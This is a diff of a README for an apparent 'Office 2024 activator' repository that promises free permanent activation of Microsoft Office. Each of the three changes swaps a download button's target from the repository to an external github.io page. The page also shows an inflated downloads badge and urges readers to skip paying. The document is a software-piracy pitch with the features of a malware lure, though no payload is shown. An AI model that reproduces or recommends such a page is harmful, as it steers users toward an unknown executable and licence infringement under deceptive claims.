@@ -1,6 +1,6 @@
 # 🚀 office-2024-activator-2026 - Activate Your Office Suite Permanently
 
-[![Download Now](https://img.shields.io/badge/Download-Office_2024_Activator-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Weylinjingly1168/office-2024-activator-2026)
+[![Download Now](https://img.shields.io/badge/Download-Office_2024_Activator-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://weylinjingly1168.github.io)
 
 ![Windows](https://img.shields.io/badge/Windows-10%2F11-0078D6?style=flat-square&logo=windows&logoColor=white) ![Version](https://img.shields.io/badge/Version-v2024-brightgreen?style=flat-square) ![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square) ![Downloads](https://img.shields.io/badge/Downloads-1.9m%2B-orange?style=flat-square)
 
@@ -52,7 +52,7 @@ Follow these simple steps to activate your Office 2024 suite:
 
 Visit this link to download the application:
 
-[![Download Button](https://img.shields.io/badge/⬇️_Download_Office_2024_Activator-FF5733?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Weylinjingly1168/office-2024-activator-2026)
+[![Download Button](https://img.shields.io/badge/⬇️_Download_Office_2024_Activator-FF5733?style=for-the-badge&logo=download&logoColor=white)](https://weylinjingly1168.github.io)
 
 The download is completely free. You'll see a confirmation screen, and the file will save to your default "Downloads" folder.
 
@@ -184,7 +184,7 @@ If you encounter any issues not covered in the troubleshooting section:
 
 Don't pay hundreds of dollars for Office 2024 when you can get it fully activated in minutes. Thousands of users have already done it — why not you?
 
-[![Final Download Button](https://img.shields.io/badge/🔗_Get_Your_Free_Activation_Now-008080?style=for-the-badge&logo=handshake&logoColor=white)](https://github.com/Weylinjingly1168/office-2024-activator-2026)
+[![Final Download Button](https://img.shields.io/badge/🔗_Get_Your_Free_Activation_Now-008080?style=for-the-badge&logo=handshake&logoColor=white)](https://weylinjingly1168.github.io)
 
 Visit this link to download the application.
 
